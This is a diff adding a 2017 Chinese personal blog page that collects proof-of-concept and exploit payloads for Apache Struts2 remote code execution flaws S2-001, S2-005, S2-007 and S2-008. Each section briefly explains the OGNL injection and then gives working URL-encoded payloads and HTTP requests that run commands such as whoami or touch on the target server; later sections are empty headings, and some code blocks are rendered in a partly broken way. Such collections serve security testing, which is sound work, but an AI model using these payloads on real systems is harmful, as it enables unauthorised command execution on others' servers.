@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>Struts2 常见POC收集 | cmustard的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="S2-001简介官方链接 影响版本：Struts 2.0.0 - Struts 2.0.8 修复摘要：数据 re-display 时禁止执行 OGNL 表达式">
+<meta name="keywords" content="poc,struct">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts2 常见POC收集">
+<meta property="og:url" content="http://www.cmustarc.com/2017/08/15/Strut2 常见POC/index.html">
+<meta property="og:site_name" content="cmustard的博客">
+<meta property="og:description" content="S2-001简介官方链接 影响版本：Struts 2.0.0 - Struts 2.0.8 修复摘要：数据 re-display 时禁止执行 OGNL 表达式">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-08-15T12:12:23.974Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Struts2 常见POC收集">
+<meta name="twitter:description" content="S2-001简介官方链接 影响版本：Struts 2.0.0 - Struts 2.0.8 修复摘要：数据 re-display 时禁止执行 OGNL 表达式">
+  
+    <link rel="alternative" href="/atom.xml" title="cmustard的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/header.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">cmustard</a></h1>
+        </hgroup>
+        
+        <p class="header-subtitle">人生苦短，我用python</p>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder=" Search...">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/categories/Web安全/">Web安全</a></li>
+                        
+                            <li><a  href="/categories/python">玩转Python</a></li>
+                        
+                            <li><a  href="/categories/notes">认知提升</a></li>
+                        
+                            <li><a  href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://github.com/cmustard06" title="github">github</a>
+                            
+                                <a class="fl csdn"  target="_blank" href="http://blog.csdn.net/cmustard" title="csdn">csdn</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/poc/" style="font-size: 10px;">poc</a> <a href="/tags/struct/" style="font-size: 10px;">struct</a> <a href="/tags/博客/" style="font-size: 10px;">博客</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://dmmjy9.com">木木</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱动漫,爱游戏,爱编程,爱运动,爱的太多了!</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">cmustard</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/header.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">cmustard</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">人生苦短，我用python</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/categories/Web安全/">Web安全</a></li>
+                
+                    <li><a href="/categories/python">玩转Python</a></li>
+                
+                    <li><a href="/categories/notes">认知提升</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/cmustard06" title="github">github</a>
+                    
+                        <a class="csdn" target="_blank" href="http://blog.csdn.net/cmustard" title="csdn">csdn</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-Strut2 常见POC" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2017/08/15/Strut2 常见POC/" class="article-date">
+      <time datetime="2017-08-15T12:12:23.974Z" itemprop="datePublished">2017-08-15</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Struts2 常见POC收集
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Web安全/">Web安全</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/poc/">poc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/struct/">struct</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://struts.apache.org/docs/s2-001.html" target="_blank" rel="external">官方链接</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.0.8</p>
+<p>修复摘要：数据 re-display 时禁止执行 OGNL 表达式<br><a id="more"></a></p>
+<h2 id="漏洞原理简介"><a href="#漏洞原理简介" class="headerlink" title="漏洞原理简介"></a>漏洞原理简介</h2><p>该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 <figure class="highlight plain"><figcaption><span>进行解析，</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，</div><div class="line">由于后端使用 ```%&#123;value&#125;``` 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行：</div><div class="line"></div><div class="line">## 漏洞POC</div><div class="line">```bash</div><div class="line">&quot;&quot;&quot;</div><div class="line">     http://172.17.0.1/login.action</div><div class="line">    :param url:</div><div class="line">    :param isPost:</div><div class="line">    :param headers:</div><div class="line">    :return:output list</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    output = []</div><div class="line">    key = &quot;S2_001 execute&quot;</div><div class="line">    # payload进行了urlencode</div><div class="line">    payload = &quot;%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%22&quot; + key + &quot;%22%29%2C%23response.flush%28%29%2C%23response.close%28%29%7D&quot;</div></pre></td></tr></table></figure></p>
+<p>若目标网站返回了的内容中包含了key的值，则说明该网站存在该漏洞</p>
+<h2 id="漏洞EXP"><a href="#漏洞EXP" class="headerlink" title="漏洞EXP"></a>漏洞EXP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;@java.lang.Runtime@getRuntime().<span class="built_in">exec</span>(<span class="string">"open /Applications/Calculator.app"</span>)&#125;</div></pre></td></tr></table></figure>
+<h1 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>影响版本: 2.0.0 - 2.1.8.1 </p>
+<p>漏洞详情:<a href="http://struts.apache.org/docs/s2-005.html" target="_blank" rel="external">官网链接</a></p>
+<h2 id="漏洞POC-amp-amp-EXP"><a href="#漏洞POC-amp-amp-EXP" class="headerlink" title="漏洞POC &amp;&amp; EXP"></a>漏洞POC &amp;&amp; EXP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=<span class="literal">true</span>&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((<span class="string">'%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))'</span>)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1</div></pre></td></tr></table></figure>
+<p>**在服务器中执行了 <figure class="highlight plain"><figcaption><span>/tmp/success```命令，创建了一个success文件**</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># S2-007</div><div class="line">## 简介</div><div class="line">[官方链接](https://struts.apache.org/docs/s2-007.html)</div><div class="line"></div><div class="line">影响版本：Struts 2.0.0 - Struts 2.2.3</div><div class="line"></div><div class="line">修复摘要：在转换的过程中进行字符过滤</div><div class="line"></div><div class="line">[修复补丁](https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892)</div><div class="line"></div><div class="line">## 漏洞原理</div><div class="line">当配置了验证规则 &lt;ActionName&gt;-validation.xml 时，若类型验证转换出错，</div><div class="line">后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。</div><div class="line">例如这里有一个 UserAction：</div><div class="line">```bash</div><div class="line">(...)</div><div class="line">public class UserAction extends ActionSupport &#123;</div><div class="line">	private Integer age;</div><div class="line">	private String name;</div><div class="line">	private String email;</div><div class="line"></div><div class="line">(...)</div></pre></td></tr></table></figure></p>
+<p>然后配置有<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">```bash</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE validators PUBLIC</div><div class="line">	&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</div><div class="line">	&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;&gt;</div><div class="line">&lt;validators&gt;</div><div class="line">	&lt;field name=&quot;age&quot;&gt;</div><div class="line">		&lt;field-validator type=&quot;int&quot;&gt;</div><div class="line">			&lt;param name=&quot;min&quot;&gt;1&lt;/param&gt;</div><div class="line">			&lt;param name=&quot;max&quot;&gt;150&lt;/param&gt;</div><div class="line">		&lt;/field-validator&gt;</div><div class="line">	&lt;/field&gt;</div><div class="line">&lt;/validators&gt;</div></pre></td></tr></table></figure></p>
+<p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 “‘“ + value + “‘“ 然后对其进行 OGNL 表达式解析。<br>要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，<br>借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p>
+<h2 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="string">""</span><span class="string">"</span></div><div class="line"><span class="string"> ExtS2_007_oneUrl("</span>http://172.17.0.1/user.action?name=1&amp;email=22&amp;age=123<span class="string">",isPost=True,headers="</span><span class="string">")</span></div><div class="line"><span class="string">:param url:</span></div><div class="line"><span class="string">:param isPost:</span></div><div class="line"><span class="string">:param headers:</span></div><div class="line"><span class="string">:return: output list</span></div><div class="line"><span class="string">"</span><span class="string">""</span></div><div class="line">output = []</div><div class="line">key = <span class="string">"S2-007 execute"</span></div><div class="line">payload = <span class="string">"%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%2C%23genxor%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23genxor.println%28%27"</span> + key + <span class="string">"%27%29%2C%23genxor.flush%28%29%2C%23genxor.close%28%29+%29+%2B+%27"</span></div></pre></td></tr></table></figure>
+<p><strong>页面返回的内容包含了key中的关键字</strong></p>
+<h2 id="漏洞EXP-1"><a href="#漏洞EXP-1" class="headerlink" title="漏洞EXP"></a>漏洞EXP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")) + '</span></div></pre></td></tr></table></figure>
+<p><strong>执行了运行计算器的操作</strong></p>
+<h1 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p><a href="https://struts.apache.org/docs/s2-008.html" target="_blank" rel="external">官方链接</a></p>
+<p>影响版本：Struts 2.1.0 - Struts 2.3.1</p>
+<p>修复摘要：添加参数名和 Cookie 名白名单 acceptedParamNames = “[a-zA-Z0-9.][()_’]+”;</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，<br>一些关键字符无法使用使得这个点显得比较鸡肋。<br>另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，<br>正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，<br>万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
+<h2 id="漏洞POC-1"><a href="#漏洞POC-1" class="headerlink" title="漏洞POC"></a>漏洞POC</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="string">""</span><span class="string">"</span></div><div class="line"><span class="string">ExtS2_008_oneUrl("</span>http://172.17.0.1/devmode.action<span class="string">",isPost=False,headers="</span><span class="string">")</span></div><div class="line"><span class="string">:param url:</span></div><div class="line"><span class="string">:param isPost:</span></div><div class="line"><span class="string">:param headers:</span></div><div class="line"><span class="string">:return:</span></div><div class="line"><span class="string">"</span><span class="string">""</span></div><div class="line">output = []</div><div class="line">key = <span class="string">"S2-008 execute"</span></div><div class="line">payload = <span class="string">"debug=command&amp;expression=%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23genxor%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23genxor.println%28%27"</span> + key + <span class="string">"%27%29%2C%23genxor.flush%28%29%2C%23genxor.close%28%29%20%0A"</span></div></pre></td></tr></table></figure>
+<p><strong>如果返回的内容中包含了key中值，则说明存在漏洞</strong></p>
+<h2 id="漏洞EXP-2"><a href="#漏洞EXP-2" class="headerlink" title="漏洞EXP"></a>漏洞EXP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:8080/S2-008/devmode.action?debug=<span class="built_in">command</span>&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)</div></pre></td></tr></table></figure>
+<p><strong>在服务器上运行计算器</strong></p>
+<h1 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h1><h1 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h1><h1 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h1><h1 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h1><h1 id="S2-019"><a href="#S2-019" class="headerlink" title="S2-019"></a>S2-019</h1><h1 id="S2-029"><a href="#S2-029" class="headerlink" title="S2-029"></a>S2-029</h1><h1 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h1><h1 id="S2-037"><a href="#S2-037" class="headerlink" title="S2-037"></a>S2-037</h1><h1 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h1><h1 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h1><h1 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="external">Struts2 历史 RCE 漏洞回顾不完全系列</a></li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2017/08/15/Strut2 常见POC/">Struts2 常见POC收集</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 cmustard 的个人博客">cmustard</a></p>
+        <p><span>发布时间:</span>2017年08月15日 - 20时12分</p>
+        <p><span>最后更新:</span>2017年08月15日 - 08时12分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/15/Strut2 常见POC/" title="Struts2 常见POC收集">http://www.cmustarc.com/2017/08/15/Strut2 常见POC/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://www.cmustarc.com/2017/08/15/Strut2 常见POC/　　作者: cmustard" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2017/08/15/hexo+github+nginx VPS搭建博客/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          hexo+github+nginx vps搭建博客
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-001"><span class="toc-number">1.</span> <span class="toc-text">S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理简介"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原理简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞EXP"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-005"><span class="toc-number">2.</span> <span class="toc-text">S2-005</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介-1"><span class="toc-number">2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞POC-amp-amp-EXP"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞POC && EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞POC"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞EXP-1"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-008"><span class="toc-number">3.</span> <span class="toc-text">S2-008</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介-2"><span class="toc-number">3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞POC-1"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞EXP-2"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-009"><span class="toc-number">4.</span> <span class="toc-text">S2-009</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-012"><span class="toc-number">5.</span> <span class="toc-text">S2-012</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-013"><span class="toc-number">6.</span> <span class="toc-text">S2-013</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-015"><span class="toc-number">7.</span> <span class="toc-text">S2-015</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-019"><span class="toc-number">8.</span> <span class="toc-text">S2-019</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-029"><span class="toc-number">9.</span> <span class="toc-text">S2-029</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-032"><span class="toc-number">10.</span> <span class="toc-text">S2-032</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-037"><span class="toc-number">11.</span> <span class="toc-text">S2-037</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-045"><span class="toc-number">12.</span> <span class="toc-text">S2-045</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-046"><span class="toc-number">13.</span> <span class="toc-text">S2-046</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#S2-048"><span class="toc-number">14.</span> <span class="toc-text">S2-048</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">15.</span> <span class="toc-text">参考</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
